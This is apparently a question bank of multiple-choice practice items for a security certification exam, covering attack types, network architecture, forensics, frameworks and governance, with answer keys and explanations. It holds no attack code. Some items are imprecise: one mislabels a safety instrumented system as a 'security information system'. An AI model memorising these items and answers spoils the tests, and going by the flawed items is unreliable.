  {id:237,domain:T,question:"What is an XML injection attack?",options:["Embedding malicious JavaScript payloads within HTML web pages to execute client-side code in other authenticated users' browsers","Inserting malicious XML code into application input to manipulate XML parsers or backend systems","Flooding a web service endpoint with millions of malformed XML-formatted requests to exhaust server-side parsing and processing resources","Directly modifying XML-formatted application configuration files stored on a server to alter security settings and access control rules"],answer:1,explanation:"XML injection exploits applications that process XML input without proper validation, potentially altering data or structure.",optionExplanations:["Embedding JavaScript in web pages describes cross-site scripting (XSS); XML injection targets XML parsers and backend systems by inserting malicious XML into application inputs.","XML injection embeds malicious XML content to alter document structure, bypass security checks, or extract data.","Resource exhaustion through request flooding describes a denial-of-service attack; XML injection manipulates XML parser behavior to alter application logic, not overwhelm resources.","Directly editing server files requires file system access, not an injection attack; XML injection exploits unvalidated user input fields to insert malicious XML into parser processing."]},
  {id:238,domain:T,question:"What is a smurf attack?",options:["A type of social engineering using fake IT personas","A DDoS amplification attack using ICMP broadcast traffic","Malware that hides inside security software","A USB-based data exfiltration technique"],answer:1,explanation:"A smurf attack spoofs the victim's IP as the source in ICMP echo requests sent to a broadcast address, flooding the victim with replies.",optionExplanations:["Fake IT personas describe pretexting or IT impersonation social engineering.","A smurf attack exploits ICMP broadcasts: the attacker spoofs the victim's IP, causing an entire network to send replies to the victim.","Malware hiding in security software describes a Trojan or rootkit.","USB-based exfiltration is a physical data theft technique."]},
  {id:239,domain:T,question:"What is the purpose of a network sniffer in a security context?",options:["Block malicious traffic","Capture and analyze network packets for troubleshooting or malicious monitoring","Encrypt all network traffic","Scan systems for open ports"],answer:1,explanation:"Sniffers (Wireshark, tcpdump) capture raw packets; used legitimately for troubleshooting, maliciously for credential theft.",optionExplanations:["Blocking traffic is the function of firewalls and IPS, not sniffers.","A packet sniffer captures network traffic for analysis; in attacker hands it captures credentials, cookies, and data.","Encrypting traffic is done by protocols like TLS; sniffers analyze existing traffic.","Port scanning is active reconnaissance; sniffing is passive packet capture."]},
  {id:240,domain:T,question:"Which of the following BEST describes an on-path attack (formerly MITM)?",options:["An attack from an insider with elevated privileges","An attacker positioned between two communicating parties to intercept or modify traffic","A DDoS attack using multiple compromised systems","A targeted social engineering email campaign that sends fraudulent messages to executives to steal credentials or authorize fraudulent wire transfers"],answer:1,explanation:"An on-path attacker inserts themselves between client and server to eavesdrop or modify the communication.",optionExplanations:["An insider with elevated privileges describes a privileged insider threat, not an on-path attack.","An on-path (formerly MITM) attack positions the attacker to intercept, inspect, or alter communications between two parties.","DDoS uses many systems to flood a target; on-path attacks intercept targeted communication.","Targeting executives with fraudulent emails describes a whaling or spear-phishing attack; an on-path attack intercepts and potentially modifies traffic between two communicating parties."]},
  {id:241,domain:A,question:"What is a software-defined network (SDN)?",options:["A network infrastructure built using commodity white-box switching hardware running community open-source network operating systems","An architecture separating network control plane from data plane, enabling centralized programmatic control","A Wi-Fi network architecture that enforces WPA3 encryption using a centralized software-based key distribution and management system","A host-based packet filtering solution implemented entirely within the operating system kernel without requiring dedicated hardware"],answer:1,explanation:"SDN decouples the control plane (network intelligence) from the data plane (packet forwarding), enabling centralized management.",optionExplanations:["White-box networking uses open hardware but does not separate the control and data planes; SDN specifically decouples the control plane from the data plane for centralized management.","SDN separates control and data planes so network behavior can be programmatically controlled through a central controller.","WPA3 wireless encryption is a security protocol for Wi-Fi; SDN separates the network control plane from the data plane to enable centralized programmable network management.","A software firewall filters packets on a single host; SDN is a network architecture that centralizes control of the entire network fabric in a programmable controller."]},
  {id:242,domain:A,question:"What is the purpose of a content delivery network (CDN) from a security perspective?",options:["Apply TLS encryption to all web server responses to protect content confidentiality as data travels between the server and browser","Distribute traffic across many servers to improve availability and absorb DDoS attacks","Route remote employee traffic through an encrypted VPN tunnel to securely access internal corporate web applications and resources","Inspect all inbound HTTP and HTTPS requests using a web application firewall to detect and block malicious payloads and injections"],answer:1,explanation:"CDNs distribute content globally and can absorb volumetric DDoS attacks by distributing the load across many PoPs.",optionExplanations:["TLS encryption protects data in transit; a CDN distributes content across globally positioned edge nodes to absorb traffic load and provide DDoS mitigation at scale.","CDNs improve performance and availability by distributing traffic, and many CDN providers include DDoS mitigation services.","VPN provides secure remote access for employees; a CDN distributes content geographically to end users to improve availability and absorb volumetric DDoS attack traffic.","A WAF inspects application-layer requests for attack patterns; a CDN primarily provides geographic distribution and DDoS absorption, though some CDNs include WAF capabilities."]},
  {id:243,domain:A,question:"What is the function of a bastion host?",options:["Maintain an offsite encrypted data repository for long-term backup retention and rapid restoration following a catastrophic data loss event","A hardened gateway host providing secured access to an internal network from an untrusted network","A multi-tenant application server hosting multiple production web services behind a shared load balancer and reverse proxy configuration","A dedicated logging server that collects, centralizes, and stores all syslog, firewall, and flow event records for security monitoring"],answer:1,explanation:"A bastion host is a highly secured, minimized system exposed to the internet as the only entry point to a secure internal network.",optionExplanations:["An offsite backup repository stores data copies for recovery; a bastion host is a hardened network gateway providing controlled administrative access into a protected internal zone.","A bastion host is extensively hardened and serves as the single, audited entry point from public networks to secure zones.","A shared web application server hosts services for users; a bastion host is a hardened administrative gateway used by authorized personnel to access internal network resources securely.","A centralized log server collects security event data; a bastion host is a hardened access gateway for administrative connections into a protected network, not a logging system."]},
  {id:244,domain:A,question:"Which of the following BEST describes a jump server (jump box)?",options:["A dedicated server environment used only for software development, testing, and quality assurance activities, isolated from production systems","An intermediary server administrators must connect through to access other servers in a secure zone","A standby server configured to automatically assume primary service responsibilities when the main production server fails or becomes unavailable","A dedicated host that continuously scans all network-connected systems for unpatched software vulnerabilities and configuration weaknesses"],answer:1,explanation:"A jump server acts as an intermediary that admins must authenticate to before connecting to critical servers, creating a chokepoint for auditing.",optionExplanations:["A dev/test server is used for software development; a jump server is an intermediary administrative host that staff must authenticate through before accessing systems in secure zones.","A jump server is a hardened intermediary that forces all administrative access through a single, monitored hop.","An automatic failover server handles high availability; a jump server is a security control requiring administrators to route all management sessions through a single audited gateway.","A vulnerability scanning host probes systems for weaknesses; a jump server is an administrative access gateway that logs and controls all sessions to systems in secure network zones."]},
  {id:245,domain:A,question:"What is TLS inspection (SSL inspection)?",options:["Configure a network security appliance to reject and drop all TLS-encrypted sessions that cannot be decrypted and inspected inline","Decrypting TLS traffic at a proxy for security analysis, then re-encrypting it","Replacing TLS with a proprietary encryption protocol","Verifying that websites use valid TLS certificates"],answer:1,explanation:"TLS inspection decrypts encrypted traffic at a proxy/NGFW to inspect for malware or policy violations, then re-encrypts it.",optionExplanations:["Blocking uninspectable encrypted traffic is a policy choice; TLS inspection decrypts and re-encrypts traffic at a proxy to allow security analysis of the content within.","TLS inspection performs a man-in-the-middle decryption for security analysis, then re-encrypts with a trusted internal CA certificate.","TLS inspection uses standard TLS; it does not replace it with a proprietary protocol.","Certificate validation is performed by browsers; TLS inspection goes further by decrypting and inspecting the content."]},
  {id:246,domain:O,question:"What is security orchestration, automation and response (SOAR)?",options:["A purely human-driven incident handling process requiring security analysts to manually execute every containment and remediation step","Platforms that automate and orchestrate security workflows, reducing response times and human workload","A federal regulatory framework mandating that organizations notify government authorities within 72 hours of confirming a data breach","A signature-based network security appliance that passively monitors traffic flows and generates analyst alerts for recognized attack patterns"],answer:1,explanation:"SOAR integrates security tools, automates alert triage and playbook execution, and orchestrates responses across multiple systems.",optionExplanations:["Manual incident handling is traditional SecOps; SOAR automates and orchestrates those manual steps, integrating tools and workflows to reduce response times and analyst workload.","SOAR platforms automate routine tasks, orchestrate multi-tool workflows, and accelerate incident response.","Breach notification timelines are defined by regulations like GDPR and various state laws; SOAR is a technology platform that automates security workflow orchestration and response.","Passive signature-based detection describes an IDS; SOAR platforms actively automate and orchestrate response workflows across multiple security tools to reduce mean time to respond."]},
  {id:247,domain:O,question:"What is the purpose of a system hardening guide?",options:["Document network topology","Provide step-by-step configuration instructions to minimize system attack surface","Automate software deployment","Train users on secure password practices"],answer:1,explanation:"Hardening guides (like CIS Benchmarks) document specific configurations to disable unnecessary services and close attack vectors.",optionExplanations:["Network topology documentation is a network architecture task, not hardening.","Hardening guides specify configurations — disable unused ports/services, enable logging, apply patches — to reduce attack surface.","Automated deployment uses tools like Ansible; hardening guides define what to configure.","Password practice training is security awareness; hardening guides address technical system configurations."]},
  {id:248,domain:O,question:"What is a port scan and when is it used?",options:["Probing Fibre Channel and iSCSI storage area network ports to enumerate accessible storage volumes, LUNs, and shared data repositories","Using tools like Nmap to discover open ports and services on a target system","Configure firewall access control lists to deny traffic on all ports not explicitly required or approved by the organization","Capture and inspect packet payloads on designated TCP or UDP ports using a network protocol analyzer to examine application behavior"],answer:1,explanation:"Port scanning identifies open TCP/UDP ports and the services listening, revealing the attack surface of a system.",optionExplanations:["Enumerating storage network targets is SAN discovery; a port scan probes TCP/UDP ports on IP-connected hosts to discover what network services are running and accessible.","Port scanning (using Nmap, Masscan) identifies open ports and service versions for security assessment or attack reconnaissance.","Blocking unauthorized ports is a firewall hardening practice; a port scan is an active reconnaissance technique that enumerates open ports and listening services on target systems.","Protocol analysis inspects traffic on specific ports; a port scan actively probes many ports on targets to discover which are open and what services are listening."]},
  {id:249,domain:O,question:"What is a security information system (SIS) in industrial control?",options:["A security information and event management platform specifically tuned and deployed within industrial manufacturing and operational technology environments","A safety-critical system that shuts down industrial processes to prevent physical harm","A firewall between IT and OT networks","A network monitoring tool for SCADA systems"],answer:1,explanation:"Safety instrumented systems (SIS) are independent protective systems that automatically shut down processes when unsafe conditions are detected.",optionExplanations:["A SIEM aggregates and correlates security event logs; a safety instrumented system in industrial control specifically triggers automatic shutdowns to prevent physical harm to people.","A SIS monitors process conditions and executes safety functions (shutdowns) to prevent catastrophic failures.","Firewalls between IT and OT are network segmentation controls, not safety systems.","SCADA monitoring tools track operational data; SIS independently triggers safety shutdowns."]},
  {id:250,domain:O,question:"Which of the following BEST describes a security configuration management (SCM) process?",options:["Provisioning, rotating, and auditing user account passwords, API keys, and secrets across all enterprise systems and service accounts","Ensuring systems are configured consistently to security baselines and that changes are controlled","Planning and automating the scheduling of operating system and application patch deployments across all managed enterprise endpoints","Recording all physical and logical network device interconnections in a centralized network topology management and documentation database"],answer:1,explanation:"SCM tracks configurations, detects drift from baselines, and ensures changes go through proper approval processes.",optionExplanations:["Credential management handles user authentication secrets; security configuration management ensures systems adhere to security baselines and that configuration changes are reviewed and controlled.","SCM ensures systems maintain approved configurations, detects unauthorized changes, and manages configuration change approval.","Scheduling patch deployment is a patch management function; SCM ensures all systems consistently meet defined security configuration baselines and that deviations are detected and corrected.","Network topology documentation is a configuration management database (CMDB) function; SCM ensures systems are configured to security baselines and that changes are approved and tracked."]},
  {id:251,domain:P,question:"What is the purpose of a risk assessment?",options:["Train employees on security risks","Identify, analyze, and evaluate risks to determine appropriate risk treatment","Automate security monitoring","Document all security incidents"],answer:1,explanation:"A risk assessment evaluates threats, vulnerabilities, and potential impacts to prioritize risk treatment decisions.",optionExplanations:["Employee training is a risk treatment control that may result from an assessment, not the assessment itself.","Risk assessments systematically identify risks, analyze their likelihood and impact, and evaluate them against risk tolerance.","Automated monitoring is a detection control; risk assessment is a planning and evaluation process.","Incident documentation supports post-incident learning; risk assessment is a proactive planning activity."]},
  {id:252,domain:P,question:"What is the concept of 'due care' in information security?",options:["Maintaining a comprehensive risk register that documents every identified threat, its likelihood rating, and the potential business impact","Taking reasonable steps to protect an organization's assets and comply with legal obligations","Purchasing cyber liability insurance policies to contractually transfer the entire financial burden of all security incidents to the insurer","Contracting with external red team firms to perform authorized offensive security assessments against all production systems on an annual basis"],answer:1,explanation:"Due care means taking prudent, reasonable security actions — what a reasonable organization would do to protect its assets.",optionExplanations:["A risk register documents identified risks; due care is about taking reasonable protective steps and complying with legal obligations, not just documenting what risks exist.","Due care is the standard of reasonableness — implementing controls a responsible organization would use to protect assets.","Risk transfer via insurance is one risk response strategy; due care requires actively taking reasonable protective steps, not simply passing financial liability to an insurer.","Annual penetration testing is one security assurance practice; due care is a broader legal and ethical standard requiring ongoing reasonable protective measures across all security domains."]},
  {id:253,domain:P,question:"What is a security operations center (SOC)?",options:["A physical room where servers are kept","A centralized team and facility monitoring and responding to security events 24/7","A cloud-hosted SaaS vulnerability management application that aggregates scanner results and tracks remediation workflow tickets across the enterprise","An internal team of compliance auditors that reviews organizational adherence to regulatory frameworks and security control standards"],answer:1,explanation:"A SOC combines people, processes, and technology to continuously monitor, detect, analyze, and respond to security threats.",optionExplanations:["A data center is the physical server room; a SOC focuses on security monitoring and response.","A SOC is the hub of continuous security monitoring, threat detection, and incident response operations.","A vulnerability management platform tracks patching and remediation; a SOC is a centralized team and facility staffed around the clock to monitor and respond to security events.","Compliance audit teams assess regulatory adherence periodically; a SOC is an operational security function staffed 24/7 to detect, analyze, and respond to active security threats."]},
  {id:254,domain:G,question:"Which of the following describes the concept of tokenization in data security?",options:["Applying reversible AES-256 encryption to sensitive data fields so they can be decrypted using the corresponding encryption key when needed","Replacing sensitive data with a non-sensitive placeholder (token) that maps back to the original in a secure vault","Applying a one-way SHA-256 cryptographic hash function to sensitive data to produce a fixed-length digest for safe storage","Distributing fragments of sensitive records across multiple geographically separated servers to reduce the exposure from any single data breach"],answer:1,explanation:"Tokenization replaces sensitive data (like credit card numbers) with non-sensitive tokens; the mapping is in a secure token vault.",optionExplanations:["Encrypting data produces a ciphertext decryptable with the key; tokenization replaces data with a random token that has no mathematical relationship to the original, stored separately in a vault.","Tokenization substitutes sensitive values with tokens that have no exploitable mathematical relationship to the original.","Hashing is a one-way transformation producing a fixed digest; tokenization replaces data with a random placeholder token that maps back to the original only in a secure vault.","Distributing data across servers describes data sharding or secret splitting; tokenization replaces sensitive values with random tokens that can only be reversed via a separate secure vault."]},
  {id:255,domain:G,question:"What is the purpose of FIDO2 / WebAuthn?",options:["Provide encrypted email communication","Enable passwordless authentication using hardware keys or device biometrics","Manage digital certificates","Encrypt web sessions"],answer:1,explanation:"FIDO2/WebAuthn enables strong authentication via hardware security keys (YubiKey) or device biometrics, eliminating passwords.",optionExplanations:["Email encryption is handled by S/MIME and PGP; FIDO2 is a web authentication standard.","FIDO2 provides strong, phishing-resistant authentication using public-key cryptography with hardware keys or biometrics.","Certificate management is handled by PKI systems; FIDO2 is an authentication protocol.","TLS/HTTPS encrypts web sessions; FIDO2 handles the authentication step."]},
  {id:256,domain:T,question:"What is a RAT (Remote Access Trojan)?",options:["A vulnerability in remote desktop software","Malware giving attackers hidden remote control of a victim's system","A legitimate remote administration tool","A type of firewall bypass technique"],answer:1,explanation:"RATs silently install themselves and give attackers full remote control including file access, webcam, microphone, and keylogging.",optionExplanations:["RDP vulnerabilities are CVEs in Microsoft's protocol; RATs are a malware category.","A RAT is a Trojan that creates a hidden backdoor giving attackers persistent, covert remote control of the system.","Legitimate remote admin tools (like RDP, SSH) are authorized; RATs are covertly installed malware.","Firewall bypass uses tunneling or port manipulation; RATs exploit the remote access they provide, not firewalls."]},
  {id:257,domain:T,question:"What is a pass-the-hash attack?",options:["Sending the same request to a server multiple times","Using a captured NTLM password hash to authenticate without knowing the plaintext password","Distributing the same bcrypt-hashed password value to multiple user accounts so they share identical credential representations in the directory","Using precomputed rainbow table lookups to reverse-engineer MD5 password hashes stolen from a compromised authentication database"],answer:1,explanation:"Pass-the-hash exploits Windows NTLM: an attacker captures the hash and uses it directly to authenticate, bypassing the need for plaintext.",optionExplanations:["Replaying requests is a replay attack; pass-the-hash specifically reuses authentication hashes.","Pass-the-hash uses a captured NTLM hash as the authentication credential without needing to crack it.","Sharing identical password hashes among accounts is a credential provisioning issue; pass-the-hash uses a stolen hash from one account to authenticate as that specific user elsewhere.","Rainbow table attacks crack weak hashes to recover plaintext passwords; pass-the-hash uses the hash itself directly for NTLM authentication without needing to crack it first."]},
  {id:258,domain:T,question:"What is privilege escalation?",options:["Enrolling a staff member in advanced technical certification courses or professional development programs to improve their job performance","Gaining higher-level access rights than originally granted, either through exploitation or misconfiguration","Elevating the importance of a security incident","Issuing time-limited administrative credentials to a technician to allow them to perform scheduled maintenance on specific systems"],answer:1,explanation:"Privilege escalation exploits vulnerabilities or misconfigurations to obtain higher privileges, such as gaining admin from a standard user account.",optionExplanations:["Providing training is a human resources activity unrelated to security exploitation; privilege escalation is the technical act of gaining higher system access through exploitation or misconfiguration.","Privilege escalation gains more access than originally assigned, often exploiting kernel vulnerabilities or misconfigured permissions.","Incident severity escalation is an IR process step; privilege escalation is an attack technique.","Temporary admin access for maintenance is an authorized IAM practice; privilege escalation involves gaining elevated access through exploitation or misconfiguration, not legitimate provisioning."]},
  {id:259,domain:T,question:"Which of the following is a characteristic of a polymorphic virus?",options:["It only infects specific file types","It changes its code signature with each infection to evade detection","It encrypts victim files for ransom","It self-replicates without a host file"],answer:1,explanation:"Polymorphic malware mutates its code each replication cycle, making signature-based detection very difficult.",optionExplanations:["File-type specificity is a property of some viruses but not what defines polymorphism.","Polymorphic viruses alter their own code (encryption, code mutation) each time they replicate, evading signature detection.","File encryption for ransom defines ransomware, not polymorphism.","Self-replication without a host defines a worm; polymorphism is about code mutation to evade detection."]},
  {id:260,domain:T,question:"What is a Trojan dropper?",options:["A Trojan that deletes files when triggered","Malware whose primary function is to install other malware on the system","File-encrypting malware that locks all accessible data and displays a ransom demand requiring cryptocurrency payment to restore access","A Trojan that steals files and sends them to a C2 server"],answer:1,explanation:"A dropper's purpose is to deliver and install additional malicious payloads (ransomware, RATs, backdoors) on the victim system.",optionExplanations:["File deletion is the function of a wiper or destructive payload; droppers deliver other malware.","A dropper is a stage-one payload whose sole job is to download and install the actual malware payload.","Ransomware encrypts files and demands payment to restore access; a Trojan dropper is specifically designed to secretly install additional malware payloads on the compromised system.","Data exfiltrating Trojans are stealers; droppers install other malware rather than stealing data themselves."]},
  {id:261,domain:A,question:"Which of the following is a security advantage of using private cloud over public cloud?",options:["Private cloud is always cheaper","Greater control over the infrastructure and data isolation","Unlimited scalability without security concerns","No need for encryption"],answer:1,explanation:"Private cloud gives organizations full control over their hardware, network, and data placement — important for sensitive data.",optionExplanations:["Private cloud typically costs more due to dedicated infrastructure; public cloud benefits from shared cost.","Private cloud provides dedicated infrastructure, greater customization, and better isolation for sensitive workloads.","Public cloud offers greater scalability; private cloud trades some scalability for control.","Encryption is required in both private and public cloud environments."]},
  {id:262,domain:A,question:"What is the purpose of a demilitarized zone (DMZ) in a network?",options:["Store the most sensitive internal data","Host public-facing services between two firewalls while protecting the internal network","Replace the need for firewalls","Provide wireless network access"],answer:1,explanation:"The DMZ isolates publicly accessible servers (web, email) from the internal network using a double-firewall architecture.",optionExplanations:["The most sensitive data belongs in the most protected internal zone, not the DMZ.","A DMZ places public servers between external and internal firewalls, providing buffer separation from the trusted network.","DMZs work with firewalls; they require at least two firewall layers.","Wireless access points are separate infrastructure; a DMZ is a network segmentation architecture."]},
  {id:263,domain:A,question:"What is the purpose of a proxy auto-config (PAC) file?",options:["Dynamically push and apply updated firewall access control list rules to network edge devices based on current threat intelligence feeds","Allow browsers to automatically determine whether to use a proxy server for a given URL","Automatically distribute VPN gateway addresses and authentication settings to remote employee devices during VPN client software installation","Push DNS resolver addresses and search domain suffix lists to endpoints via DHCP options during IP address lease assignment"],answer:1,explanation:"A PAC file is a JavaScript function browsers call to decide whether to use a proxy and which one for each URL.",optionExplanations:["Dynamic firewall rule updates are threat intelligence integration; a PAC file helps browsers determine when to route requests through a proxy based on URL-matching functions.","A PAC file defines logic for browsers to select proxy servers based on URL patterns, domains, and IP ranges.","VPN client provisioning configures remote access connectivity; a PAC file guides the browser's proxy selection logic for specific URLs, not VPN or network-level routing.","DHCP options distribute DNS and network settings; a PAC file is a JavaScript function that browsers execute to determine whether a given URL should be routed via proxy."]},
  {id:264,domain:A,question:"Which cloud deployment model combines private and public cloud environments?",options:["Community cloud","Multi-cloud","Hybrid cloud","Public cloud"],answer:2,explanation:"Hybrid cloud links private and public cloud environments, enabling workloads to move between them based on needs.",optionExplanations:["Community cloud is shared among organizations with similar requirements (e.g., government agencies).","Multi-cloud uses multiple public cloud providers without necessarily connecting to private infrastructure.","Hybrid cloud integrates private cloud (or on-premises) with public cloud services through unified management.","Public cloud is entirely operated by a third-party provider with no private component."]},
  {id:265,domain:A,question:"What is the risk of using default credentials on network devices?",options:["Default credentials are more secure than custom ones","Attackers can easily access devices because defaults are publicly known","Default credentials cannot be changed","Default credentials use stronger encryption"],answer:1,explanation:"Default credentials (admin/admin, admin/password) are documented in vendor manuals and widely known to attackers.",optionExplanations:["Default credentials are weak; they are identical across all devices of the same model and publicly documented.","Default credentials are in vendor documentation and security databases, making them trivial for attackers to exploit.","Default credentials can and must be changed; they represent a critical first hardening step.","Default credentials have no bearing on encryption; they are authentication values."]},
  {id:266,domain:O,question:"What is the purpose of a forensic write blocker?",options:["Restrict forensic analysts from duplicating, copying, or exporting any files or partition images found on evidence storage media","Allow reading storage media without any possibility of modifying it during forensic analysis","Apply parallel processing algorithms to compress forensic disk images and reduce the total time required to acquire large drives","Apply AES-256 encryption to completed disk images to protect their confidentiality and integrity during storage and chain-of-custody transfers"],answer:1,explanation:"A write blocker ensures forensic examination does not inadvertently alter evidence by blocking any write commands to the media.",optionExplanations:["Preventing analysts from copying data would hinder forensic investigation; a write blocker allows unrestricted reading while specifically preventing any writes that would alter evidence.","Write blockers are hardware or software devices that intercept write commands, ensuring evidence remains unmodified during analysis.","Compression speeds up storage of images but is separate from write blocking; a write blocker's purpose is preventing modifications to source media, not accelerating image acquisition.","Encrypting acquired images protects them in transit; a write blocker is a hardware or software device that prevents any modification to the source media during the imaging process."]},
  {id:267,domain:O,question:"What is the purpose of a master boot record (MBR) in forensics?",options:["A dedicated hardware security chip embedded on the motherboard that generates and stores cryptographic keys and measures platform integrity","The first sector of a storage device containing bootloader code and partition table, sometimes targeted by bootkits","A system database file that stores hashed user account passwords, group memberships, and local security policy settings for authentication","A PXE-enabled network boot server that distributes operating system images to diskless workstations across the LAN on demand"],answer:1,explanation:"The MBR is forensically significant because malware (bootkits) can hide there before the OS loads, evading most security tools.",optionExplanations:["A hardware chip storing keys and measuring integrity describes a TPM, not the MBR; the MBR is the first disk sector holding boot code and partition table, sometimes targeted by bootkits.","The MBR is the first physical sector of a drive, containing boot instructions and partition information; bootkits infect it for persistence.","A password/policy database file describes the SAM or /etc/shadow, not the MBR; the MBR is the first sector of a storage device containing boot code and partition information.","A PXE boot server provides network-based OS deployment; the MBR is the first physical sector of a local storage device containing bootloader code and the partition table."]},
  {id:268,domain:O,question:"What is the MITRE ATT&CK framework?",options:["A regulatory compliance standard specifying mandatory cybersecurity controls for banks and financial services firms under federal oversight","A knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations","A software development methodology that integrates security requirements and code review checkpoints throughout each phase of the development lifecycle","A standardized document template providing step-by-step guidance for security teams responding to common incident categories"],answer:1,explanation:"MITRE ATT&CK catalogs attacker TTPs organized by attack lifecycle stages, used for threat hunting, detection, and red team planning.",optionExplanations:["Regulatory standards for financial institutions include PCI DSS or GLBA; MITRE ATT&CK is a non-regulatory knowledge base of real-world adversary tactics, techniques, and procedures.","MITRE ATT&CK documents real-world adversary behaviors organized into tactics (goals) and techniques (methods).","Integrating security into development describes DevSecOps or SDLC security practices; MITRE ATT&CK catalogs attacker behaviors observed in real incidents, not development methodologies.","Step-by-step incident guidance describes a runbook or playbook; MITRE ATT&CK is a threat intelligence knowledge base cataloging attacker TTPs based on real-world observation."]},
  {id:269,domain:O,question:"What is the Cyber Kill Chain?",options:["A vendor risk management methodology for systematically assessing and securing third-party supplier and software supply chain relationships","Lockheed Martin's model describing the stages of a cyberattack from reconnaissance to exfiltration","A regulatory compliance audit checklist that helps organizations validate adherence to mandatory security controls and reporting requirements","A network architecture design model that divides infrastructure into isolated security zones separated by firewalls and access controls"],answer:1,explanation:"The Cyber Kill Chain models attacks in 7 stages: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.",optionExplanations:["Supply chain risk management addresses third-party vendor risk; the Cyber Kill Chain is Lockheed Martin's model describing the sequential stages of a cyberattack from start to exfiltration.","The Cyber Kill Chain (Lockheed Martin) describes the sequential stages attackers follow, enabling defenders to break the chain.","A compliance checklist validates regulatory control adherence; the Cyber Kill Chain is a threat modeling framework describing attack progression stages, not a compliance validation tool.","Network segmentation models define zone-based architecture; the Cyber Kill Chain is a sequential attack lifecycle model describing how adversaries progress from reconnaissance to their objectives."]},
  {id:270,domain:O,question:"What is the difference between MTTD and MTTR?",options:["MTTD and MTTR are identical and interchangeable performance metrics both measuring the speed of incident detection and remediation","MTTD is the mean time to detect a threat; MTTR is the mean time to repair/recover","MTTD quantifies how quickly a failed system is fully restored to operational status; MTTR measures how rapidly security threats are first detected","Both MTTD and MTTR calculate the average interval of time elapsed between consecutive security incidents affecting the same organizational systems"],answer:1,explanation:"MTTD measures how long it takes to detect a threat; MTTR measures how long to recover. Both are key SOC performance metrics.",optionExplanations:["They are not identical; MTTD (Mean Time To Detect) measures how long before a threat is identified, while MTTR (Mean Time To Repair) measures how long restoration takes.","MTTD (Mean Time to Detect) and MTTR (Mean Time to Repair/Respond) are distinct metrics measuring detection and recovery speed.","This reverses the definitions; MTTD measures time to detect a threat, while MTTR measures the time to repair or recover from an incident after it has been detected.","Neither metric measures time between incidents; MTTD measures detection latency for individual threats, and MTTR measures the recovery duration for individual incidents."]},
  {id:271,domain:P,question:"What is the purpose of a gap analysis in security?",options:["Run automated endpoint detection tools to identify and classify malicious software present on organizational computing assets","Compare current security posture against a target standard to identify what needs improvement","Use automated scanning tools to probe all network-connected hosts and enumerate services listening on accessible TCP and UDP ports","Deliver targeted security awareness training sessions addressing specific knowledge gaps found during an employee phishing simulation assessment"],answer:1,explanation:"A gap analysis identifies the difference between the current state of security and a desired target state (framework, standard, or regulation).",optionExplanations:["Scanning for malware is a threat detection activity; a gap analysis compares current security posture against a target standard to identify areas requiring investment or improvement.","A gap analysis systematically compares current controls against required controls, identifying what is missing or insufficient.","Port scanning discovers exposed network services; a gap analysis compares the organization's existing security capabilities against a framework or target maturity level to find shortfalls.","Training staff addresses identified weaknesses; a gap analysis is the structured process of comparing current state to a target standard, not the remediation activity that follows it."]},
  {id:272,domain:P,question:"Which framework is specifically designed for securing industrial control systems (ICS)?",options:["NIST CSF","NERC CIP","PCI DSS","ISO 27001"],answer:1,explanation:"NERC CIP (North American Electric Reliability Corporation Critical Infrastructure Protection) standards apply to bulk electric system security.",optionExplanations:["NIST CSF is a general cybersecurity framework applicable to all sectors.","NERC CIP is specifically designed for protecting the bulk power system and electric utilities from cybersecurity threats.","PCI DSS applies to payment card data environments, not industrial control systems.","ISO 27001 is a general information security management standard, not specific to ICS."]},
  {id:273,domain:P,question:"What is a penetration testing scope document?",options:["A formal findings report produced after testing that catalogs all security vulnerabilities discovered, rated by exploitability and severity","A written agreement defining the boundaries, targets, and rules of engagement for a pen test","A remediation roadmap document prioritizing recommended security improvements and fixes identified during the completed assessment engagement","A technical setup guide explaining how to install, configure, and calibrate scanning and exploitation tools before beginning a security assessment"],answer:1,explanation:"The scope document (rules of engagement) defines what can be tested, which methods are permitted, and the testing timeline.",optionExplanations:["A findings report documents discovered issues; the scope document is created before testing begins and defines the boundaries, authorized targets, and rules of engagement for the engagement.","A scope document defines boundaries, IP ranges, allowed techniques, contact information, and the test window.","A remediation roadmap addresses findings after the test; the scope document is a pre-engagement agreement defining what systems may be tested and what techniques are authorized.","A tool configuration guide is an operational reference; the scope document is a legal agreement defining the authorized boundaries, objectives, and rules of engagement for the test."]},
  {id:274,domain:P,question:"What is the purpose of a vulnerability disclosure policy?",options:["Require all external parties to sign legal non-disclosure agreements before any security vulnerability information may be shared with the organization","Define how the organization wants to receive, process, and respond to security vulnerability reports from researchers","Configure automated patch management systems to deploy remediation for every discovered vulnerability within 24 hours of initial detection","Establish a financial incentive program that rewards security researchers with monetary bounties for every confirmed vulnerability they report"],answer:1,explanation:"A VDP sets expectations for responsible disclosure, encouraging researchers to report vulnerabilities safely without legal fear.",optionExplanations:["NDAs are legal instruments, not a disclosure policy; a vulnerability disclosure policy defines the process for receiving, triaging, and responding to vulnerability reports from external researchers.","A VDP establishes a clear process for researchers to report vulnerabilities, promising legal protection and response timelines.","Automated patching timelines are a patch management policy; a vulnerability disclosure policy defines how researchers should submit findings and how the organization will communicate and respond.","A bug bounty program is one specific mechanism for receiving reports; a vulnerability disclosure policy is a broader framework defining how all vulnerability reports are received and processed."]},
  {id:275,domain:P,question:"What is a memorandum of understanding (MOU) in security context?",options:["A binding legal contract between two organizations","A non-binding agreement establishing shared understanding of security responsibilities between parties","A technical configuration document","A vendor invoice for security services"],answer:1,explanation:"An MOU documents mutual understanding and expectations, often used before a formal contract or for partner security agreements.",optionExplanations:["A legally binding contract is a formal agreement with legal remedies; an MOU is typically non-binding.","An MOU establishes mutual expectations between parties without full legal enforceability, often used to formalize partnerships.","Technical configuration documents specify system settings; MOUs define organizational relationships.","Invoices are financial documents; MOUs are relationship and expectation documents."]},
